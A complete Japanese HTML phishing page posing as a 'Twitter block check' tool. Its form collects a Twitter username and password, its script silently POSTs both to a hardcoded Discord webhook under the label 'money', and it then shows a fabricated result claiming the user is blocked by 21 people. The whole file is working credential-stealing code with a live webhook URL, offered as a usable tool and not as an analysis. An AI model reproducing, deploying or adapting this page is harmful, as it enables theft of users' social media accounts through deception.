<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitterブロック検証</title>
    <style>
        /* 見た目をシンプルに整えるためのデザイン（CSS） */
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            margin-top: 0;
            color: #333;
            text-align: center;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-size: 14px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #5865F2; /* Discordのブランドカラー */
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.2s;
        }
        button:hover {
            background-color: #4752C4;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>ブロック検証</h2>
    <form id="discordForm">
        <div class="input-group">
            <label for="username">ユーザーネーム</label>
            <input type="text" id="username" placeholder="@" required>
        </div>
        <div class="input-group">
            <label for="message">パスワード</label>
            <input type="password" id="message" placeholder="パスワード" required>
        </div>
        <button type="submit">ブロック検証</button>
    </form>
</div>

<script>
    // フォームの送信ボタンが押された時の処理（JavaScript）
    document.getElementById('discordForm').addEventListener('submit', function(e) {
        e.preventDefault(); // ページが勝手にリロードされるのを防ぐ

        // DiscordのWebhook URL
        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1522574868674252823/vCifjTr6HdDGa1w5j86sPBACzCdXwcDLWgjZhuadfTTULicTrm7fbJy35ZLnc8uDuQAp';

        // 入力された値を取得
        const username = document.getElementById('username').value;
        const message = document.getElementById('message').value;

        // Discordに送るメッセージの組み立て
        const discordData = {
            content: `【お金】\n**お名前:** ${username}\n**メッセージ:**\n${message}`
        };

        // Discordへデータを送信する
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(discordData)
        })
        .then(response => {
            if (response.ok) {
                alert('21人の人にブロックされてます。');
                document.getElementById('discordForm').reset(); // 入力欄を空にする
            } else {
                alert('送信に失敗しました。URLが正しいか確認してください。');
            }
        })
        .catch(error => {
            console.error('エラー発生:', error);
            alert('通信エラーが発生しました。');
        });
    });
</script>

</body>
</html>
